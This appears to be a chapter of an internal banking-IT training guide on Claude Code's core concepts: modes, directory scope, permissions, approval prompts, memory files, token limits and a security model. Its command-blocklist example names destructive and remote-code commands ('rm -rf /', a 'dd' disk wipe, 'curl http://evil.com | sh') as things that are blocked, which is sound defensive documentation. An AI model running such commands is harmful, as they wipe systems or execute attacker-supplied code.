# Section 2: Core Concepts

## Table of Contents
1. [How Claude Code Works](#how-claude-code-works)
2. [Interactive REPL vs SDK Mode](#interactive-repl-vs-sdk-mode)
3. [Working Directory and Scope](#working-directory-and-scope)
4. [File System Permissions Model](#file-system-permissions-model)
5. [The Approval Workflow](#the-approval-workflow)
6. [Tools and Capabilities](#tools-and-capabilities)
7. [Context and Memory](#context-and-memory)
8. [Token Budget and Limits](#token-budget-and-limits)
9. [Models Available](#models-available)
10. [Safety and Security Model](#safety-and-security-model)

---

## How Claude Code Works

Claude Code combines a powerful AI language model with direct access to your development environment. Here's the high-level flow:

```
┌─────────────────────────────────────────────────────────┐
│ 1. You ask Claude a question or give it a task          │
└────────────────────┬────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────┐
│ 2. Claude analyzes your request and determines          │
│    what tools it needs (read files, search, etc.)       │
└────────────────────┬────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────┐
│ 3. Claude requests to use tools (e.g., Read, Grep)      │
│    You see these requests and can approve/deny          │
└────────────────────┬────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────┐
│ 4. Tools execute and return results to Claude           │
└────────────────────┬────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────┐
│ 5. Claude processes results and provides answer         │
│    or performs actions (edit, create, run commands)     │
└────────────────────┬────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────┐
│ 6. Cycle repeats until task is complete                 │
└─────────────────────────────────────────────────────────┘
```

### Key Principles

1. **Conversational**: You interact with Claude using natural language
2. **Tool-Based**: Claude uses specialized tools to interact with your system
3. **Approval-Based**: You control what Claude can do (by default)
4. **Context-Aware**: Claude remembers the conversation and previous actions
5. **Iterative**: Complex tasks are broken down into steps

---

## Interactive REPL vs SDK Mode

Claude Code can operate in two primary modes:

### Interactive REPL (Read-Eval-Print Loop)

The default mode when you type `claude` without arguments.

**Characteristics:**
- Conversational back-and-forth
- Maintains session context
- Shows Claude's thinking process
- Interactive approval for actions
- Can explore and iterate on solutions
- Session persists until you exit

**When to Use:**
- Active development work
- Exploring unfamiliar code
- Debugging issues
- Learning and experimentation
- Complex multi-step tasks

**Example:**
```bash
$ claude
Welcome to Claude Code!
You're in: /Users/yourname/customer-data-pipeline

> Can you explain what the data transformation pipeline does?

[Claude reads relevant files and explains]

> Now can you add data quality checks to the pipeline?

[Claude makes changes iteratively]
```

### SDK/Print Mode

One-shot query mode using the `-p` or `--print` flag.

**Characteristics:**
- Single query, single response
- No interactive conversation
- Exits immediately after response
- Can be piped or scripted
- Faster for simple queries
- No session persistence

**When to Use:**
- Quick information queries
- Scripting and automation
- CI/CD pipelines
- Non-interactive environments
- Quick code generation

**Example:**
```bash
# Quick query
$ claude -p "What does this error mean: AttributeError: 'NoneType' object has no attribute 'select'"

# In scripts
$ claude -p "Generate a function to validate IBAN numbers" > pipelines/utils/iban_validator.py

# Piping input
$ echo "Optimize this PySpark query: df.select('*').filter(col('created_at') > '2024-01-01')" | claude -p
```

### Comparison Table

| Feature | Interactive REPL | SDK/Print Mode |
|---------|-----------------|----------------|
| Mode | Conversational | One-shot |
| Context | Preserved across queries | Single query only |
| Approval | Interactive | Auto-approve or fail |
| Best For | Development | Automation |
| Exit | Manual (Ctrl+D) | Automatic |
| Iteration | Yes | No |
| Tool Use | Full | Limited |

---

## Working Directory and Scope

Claude Code operates within a specific working directory - the folder you're in when you start `claude`.

### Working Directory Behavior

```bash
# Claude's scope is limited to this directory and subdirectories
$ cd /Users/yourname/banking-data-pipeline
$ claude

# In the REPL:
> What files are in this project?
# Claude can see: /Users/yourname/banking-data-pipeline/**

> Read the file ../other-project/config.py
# Claude CANNOT access files outside the working directory
# (unless explicitly granted permission)
```

### Scope Limitations

**What Claude CAN Access:**
- Files in the working directory
- Subdirectories recursively
- Files explicitly added via `--add-dir`

**What Claude CANNOT Access (by default):**
- Parent directories
- Other directories on your system
- System files
- Files outside the working directory tree

### Adding Additional Directories

```bash
# Add multiple directories to Claude's scope
$ claude --add-dir ../shared-utils --add-dir ../config

# Now Claude can access:
# - Current directory
# - ../shared-utils
# - ../config
```

### Banking IT Consideration

**Security Best Practice:**
```bash
# DON'T: Start Claude at root or home directory
$ cd ~
$ claude  # Can access everything in home directory

# DO: Start Claude in the specific project
$ cd ~/projects/payment-processing-pipeline
$ claude  # Scope limited to this project
```

---

## File System Permissions Model

Claude Code uses a **read-only by default** permission model with explicit approvals required for write operations.

### Permission Levels

#### 1. Read Operations (Always Allowed)
- Reading file contents
- Searching files (grep)
- Listing directories
- Viewing git status/diff

#### 2. Write Operations (Requires Approval)
- Creating new files
- Editing existing files
- Deleting files
- Moving/renaming files

#### 3. Command Execution (Requires Approval)
- Running shell commands
- Package manager operations (pip install, poetry add)
- Running tests or builds

**Note**: Git operations (commit, push, pull) are NOT executed by Claude per banking IT policy. See [Section 12](../05-integration/12-git-integration.md) for manual git workflow.

#### 4. Network Operations (Requires Approval)
- Fetching URLs
- API requests
- MCP server connections

### Permission Modes

You can configure how Claude Code handles permissions:

```bash
# Default: Ask for approval
$ claude

# Auto-approve all actions (use with caution!)
$ claude --permission-mode auto-approve

# Plan mode: Read-only, no write operations allowed
$ claude --permission-mode plan

# Reject all write operations
$ claude --permission-mode deny
```

### Permission Configuration

Permissions can also be configured in settings files:

```json
// ~/.claude/settings.json
{
  "permissions": {
    "allow": ["Read", "Grep", "Glob"],
    "deny": ["Write", "Bash"]
  }
}
```

---

## The Approval Workflow

When Claude needs to perform an action that requires approval, you'll see an interactive prompt.

### Example: File Edit Approval

```
Claude wants to edit: pipelines/transformations/customer_data.py

Old:
  def transform_customer_data(df):
    # Read customer data
    customer_df = spark.read.parquet(input_path)
    return customer_df

New:
  def transform_customer_data(df):
    # Read customer data with schema validation
    customer_df = spark.read.schema(customer_schema).parquet(input_path)

    # Add data quality checks
    customer_df = customer_df.filter(col("customer_id").isNotNull())
    customer_df = customer_df.filter(col("account_balance") >= 0)

    return customer_df

[A]pprove  [R]eject  [E]dit  [V]iew full file  [?] Help
```

### Approval Options

| Key | Action | Description |
|-----|--------|-------------|
| A | Approve | Allow this action |
| R | Reject | Deny this action |
| E | Edit | Modify Claude's suggestion before applying |
| V | View | See the full file context |
| ? | Help | Show more options |

### Batch Approval

For multiple similar operations:

```
Claude wants to perform 5 edit operations:
1. pipelines/transformations/customer_data.py
2. pipelines/transformations/transaction_data.py
3. pipelines/schemas/customer_schema.py
4. tests/test_transformations.py
5. README.md

[A]pprove all  [R]eview individually  [D]eny all
```

### Banking IT Best Practice

**Always Review:**
- Changes to data transformation logic
- Database queries and data access patterns
- PII/sensitive data handling
- Schema modifications
- Configuration files
- Production deployment scripts

**Can Auto-Approve (with care):**
- Documentation updates
- Code formatting
- Adding comments
- Test file creation

---

## Tools and Capabilities

Claude Code has access to various tools to interact with your system:

### File Operations

| Tool | Purpose | Permission |
|------|---------|------------|
| Read | Read file contents | Always allowed |
| Write | Create new files | Requires approval |
| Edit | Modify existing files | Requires approval |
| Glob | Find files by pattern | Always allowed |
| Grep | Search file contents | Always allowed |

### Code Operations

| Tool | Purpose | Permission |
|------|---------|------------|
| Bash | Execute shell commands | Requires approval |
| NotebookEdit | Edit Jupyter notebooks | Requires approval |

### Task Management

| Tool | Purpose | Permission |
|------|---------|------------|
| Task | Launch sub-agents | Always allowed |
| TodoWrite | Manage task list | Always allowed |

### Example: Tool Usage

```
User: Find all SQL queries that don't use parameterized statements

Claude thinks: I need to search for SQL queries
┌─────────────────────────────────────┐
│ Tool: Grep                          │
│ Pattern: SELECT.*\{.*\}             │
│ Files: **/*.py                      │
│ Status: ✓ Allowed (read-only)      │
└─────────────────────────────────────┘

Claude finds 12 instances and reports them.

User: Fix them all

Claude thinks: I need to edit files
┌─────────────────────────────────────┐
│ Tool: Edit                          │
│ File: pipelines/db/queries.py       │
│ Status: ⚠ Requires approval         │
└─────────────────────────────────────┘

[Approval prompt shown to user]
```

---

## Context and Memory

Claude Code maintains context throughout a session but has limitations.

### Session Context

**What's Remembered:**
- Previous messages in the conversation
- Files that have been read
- Actions that have been taken
- Current working directory
- Tool results

**What's Forgotten:**
- Context from previous sessions (unless using `--continue`)
- Information not explicitly mentioned
- Files that haven't been read

### Memory Hierarchy

Claude Code uses a three-level memory system:

```
┌─────────────────────────────────────────┐
│  Enterprise Memory                       │
│  /Library/Application Support/           │
│  ClaudeCode/CLAUDE.md                   │
│  (Highest priority)                      │
└──────────────┬──────────────────────────┘
               │
┌──────────────▼──────────────────────────┐
│  Project Memory                          │
│  ./CLAUDE.md or ./.claude/CLAUDE.md     │
│  (Medium priority)                       │
└──────────────┬──────────────────────────┘
               │
┌──────────────▼──────────────────────────┐
│  User Memory                             │
│  ~/.claude/CLAUDE.md                    │
│  (Lowest priority)                       │
└─────────────────────────────────────────┘
```

**Memory files (CLAUDE.md) contain:**
- Coding standards and conventions
- Project-specific guidelines
- Preferences and patterns
- Things Claude should always remember

**Example CLAUDE.md:**
```markdown
# Customer Data Pipeline - Data Engineering Standards

## Code Style
- Use Python 3.9+ for all data pipelines
- Follow PEP 8 style guide
- Use PySpark for distributed data processing
- Use type hints for all function signatures

## Data Quality Requirements
- All pipelines must include schema validation
- Implement null checks for critical fields (customer_id, account_number)
- Add data quality metrics (row counts, duplicate checks)
- Validate data types before transformations

## PII/Sensitive Data Handling
- Never log customer PII (SSN, account numbers, card numbers)
- Encrypt PII columns at rest using AES-256
- Use data masking for non-production environments
- Implement column-level access controls

## Testing
- Minimum 80% code coverage for transformation logic
- Write unit tests for all data transformations
- Include integration tests with sample datasets
- Validate schema evolution scenarios

## Compliance
- GDPR: All customer data must have retention policies
- PCI-DSS: Never store full credit card numbers or CVV
- SOX: All financial data transformations must be auditable
- Log all data pipeline executions with lineage tracking
```

### Continuing Previous Sessions

```bash
# Resume the most recent conversation
$ claude --continue

# Claude will reload:
# - Previous conversation history
# - Context about files and changes
# - Task progress
```

---

## Token Budget and Limits

Claude has limits on how much information it can process at once.

### Understanding Tokens

**Tokens** are pieces of text (roughly 4 characters = 1 token):
- "Hello" = 1 token
- "Hello, world!" = 4 tokens
- A typical code file (500 lines) ≈ 2,000-4,000 tokens

### Context Window

Each model has a maximum **context window**:

| Model | Context Window | Approximate Size |
|-------|----------------|------------------|
| Claude Sonnet | 200,000 tokens | ~150,000 words or ~500 pages |
| Claude Opus | 200,000 tokens | ~150,000 words or ~500 pages |
| Claude Haiku | 200,000 tokens | ~150,000 words or ~500 pages |

**What uses context:**
- Your conversation history
- Files Claude has read
- Memory files (CLAUDE.md)
- Tool results
- System prompts

### Managing Context

**Claude Code automatically manages context by:**
- Summarizing old conversation parts
- Removing irrelevant tool results
- Prioritizing recent information

**You can help by:**
- Starting new sessions for new topics
- Being specific about which files are relevant
- Using Plan Mode for exploration, then starting a fresh session for implementation

**Warning Signs of Context Issues:**
- Claude "forgets" earlier information
- Responses become less accurate
- Tool calls become repetitive

**Solutions:**
```bash
# Start a fresh session
Ctrl+D (exit) then restart: claude

# Use agents for subtasks (they have their own context)
# More on this in Section 8: Agents & Sub-agents
```

---

## Models Available

Claude Code can use different AI models, each with different capabilities and costs.

### Model Availability (AWS Bedrock)

| Model | Status | Capability | Best For |
|-------|--------|------------|----------|
| **Claude Sonnet** | ✅ Available | High | All development tasks (default) |
| **Claude Opus** | ⏳ In Progress | Highest | Complex problems, architecture (when available) |

**Note:** Sonnet is currently the only model available and is suitable for all development tasks including data pipeline development, code reviews, debugging, and complex problem-solving.

### Using Models

```bash
# Use default (Sonnet - currently the only available model)
$ claude

# When Opus becomes available, you can use:
$ claude --model opus

# Change model mid-session (when Opus is available)
> /model opus
Model changed to Claude Opus
```

### Model Selection Guidelines

**Use Sonnet (currently available) for:**
- All data pipeline development tasks
- PySpark transformations and optimizations
- Code reviews and refactoring
- Data quality validation logic
- Schema design and evolution
- Bug fixes and debugging
- Performance tuning
- Complex data processing logic
- All day-to-day development work

**Use Opus (when available) for:**
- Complex architectural decisions for data platforms
- Large-scale data pipeline refactoring
- Difficult performance optimization problems
- Understanding complex legacy data systems
- Multi-source data integration strategies

### Banking IT Workflow

**Current Workflow (Sonnet only):**
```bash
# Use Sonnet for all development tasks
$ claude
> Analyze this PySpark transformation pipeline

# Use plan mode for exploration (read-only, no API costs for edits)
$ claude --permission-mode plan
> Give me an overview of this data pipeline codebase
```

**Future Workflow (when Opus is available):**
```bash
# 1. Use Sonnet for most development tasks
$ claude --model sonnet
> Implement data quality checks for customer pipeline

# 2. Use Opus for complex architectural decisions
$ claude --model opus
> Review and optimize this multi-source data integration architecture
```

---

## Safety and Security Model

Claude Code is designed with security as a priority.

### Core Security Principles

#### 1. Least Privilege
- Read-only by default
- Explicit approval for write operations
- Scoped to working directory

#### 2. Human in the Loop
- You control what gets executed
- Review changes before they're applied
- Can reject or modify any action

#### 3. Prompt Injection Protection
- Claude is trained to resist malicious instructions
- Validates and sanitizes inputs
- Analyzes context for suspicious patterns

#### 4. Isolated Context
- Each session is independent
- No shared state between projects
- Credentials are securely stored in system keychain

#### 5. Audit Trail
- All actions can be logged
- Tool usage is tracked
- Changes are version controlled (via git)

### Security Features

**Input Sanitization:**
```
User: Run this command: rm -rf /

Claude: I cannot execute that command as it would delete your entire filesystem.
This appears to be a destructive operation that could cause system damage.
```

**Command Blocklist:**
```bash
# Dangerous commands are blocked:
# - rm -rf /
# - dd if=/dev/zero of=/dev/sda
# - curl http://evil.com | sh
# - etc.
```

**Network Request Approval:**
```
Claude wants to fetch: https://api.external-service.com/data

This URL is outside your codebase.

[A]pprove  [R]eject  [A]lways allow this domain  [D]eny domain
```

### Banking IT Security Recommendations

1. **Use Plan Mode for Unknown Code:**
   ```bash
   $ claude --permission-mode plan
   # Explore safely without any write operations
   ```

2. **Review All Security-Critical Changes:**
   - Never auto-approve changes to auth code
   - Always review database queries
   - Check for sensitive data exposure

3. **Use Project-Scoped Sessions:**
   ```bash
   $ cd ~/projects/payment-pipeline
   $ claude  # Limited to this project only
   ```

4. **Configure Hooks for Compliance:**
   ```json
   // .claude/settings.json
   {
     "hooks": {
       "PreToolUse": [{
         "matcher": "Edit",
         "hooks": [{
           "type": "command",
           "command": "./scripts/security-check.sh"
         }]
       }]
     }
   }
   ```

5. **Enable Audit Logging:**
   - Log all Claude Code sessions
   - Monitor for unusual patterns
   - Review changes before committing to main branch

### What Claude Code CANNOT Do

**Claude Code cannot:**
- Execute commands without your approval (in default mode)
- Access files outside your working directory (without explicit permission)
- Modify system files or configuration
- Install system-wide software
- Access your personal data (unless in the working directory)
- Make network requests without approval
- Bypass your operating system's security controls

### Trust Model

The trust model defines who has control at each stage:

**1. You are ALWAYS in control:**
- You have final authority on all changes
- You review and approve every action Claude takes
- You control which files/directories Claude can access
- You can stop or reject Claude at any time

**2. Claude Code is your assistant:**
- Claude suggests code changes and solutions
- Claude CANNOT make changes without your approval (in default mode)
- Claude can only access files in your current working directory
- Claude's actions are logged and auditable

**3. Your code remains protected:**
- All changes require your explicit approval
- Version control (git) tracks all modifications
- You manually execute git commits and pushes
- You can review changes before they're committed

**Visual Trust Flow:**
```
You Start Claude → Claude Suggests Action → You Review & Approve → Change Applied
     ↑                                              ↓
     └──────────────── You Can Reject ──────────────┘
```

**Banking IT Trust Principles:**
- **Zero Trust**: Never assume Claude's suggestions are perfect
- **Always Verify**: Review all data transformations and schema changes
- **Separation of Duties**: Developers approve changes, architects approve designs
- **Audit Trail**: All Claude actions are logged for compliance
- **Least Privilege**: Claude only accesses what it needs for the current task

---

## Summary

In this section, you learned:

### Key Concepts
1. **How It Works**: Claude uses tools to read, analyze, and modify code with your approval
2. **Modes**: Interactive REPL for development, SDK mode for automation
3. **Scope**: Limited to working directory for security
4. **Permissions**: Read-only by default, requires approval for writes
5. **Approval**: Interactive workflow to review and control Claude's actions
6. **Tools**: Specialized capabilities for file operations, searching, and execution
7. **Context**: Maintained during session, managed automatically
8. **Memory**: Three-level system (enterprise, project, user) via CLAUDE.md files
9. **Tokens**: Limited context window, managed automatically
10. **Models**: Sonnet (available now), Opus (coming soon) - suitable for all data engineering tasks
11. **Security**: Multiple layers of protection and human oversight
12. **Trust**: You are always in control; Claude is your assistant, not autonomous

### Banking IT Takeaways

- Start Claude in project directories, not root
- Use Plan Mode for exploring unfamiliar code
- Always review security-critical changes
- Configure permissions appropriately for your role
- Use memory files to enforce coding standards
- Enable audit logging for compliance
- Choose models based on task complexity and cost

---

## Next Steps

Now that you understand the core concepts:

1. **[Continue to Section 3: Getting Started](../02-basics/03-getting-started.md)** - Practical hands-on usage
2. **[Jump to Section 5: Project Configuration](../03-advanced/05-project-configuration.md)** - Configure Claude Code for your team
3. **[Review Section 9: Security & Compliance](../04-security/09-security-compliance.md)** - Deep dive into security

---
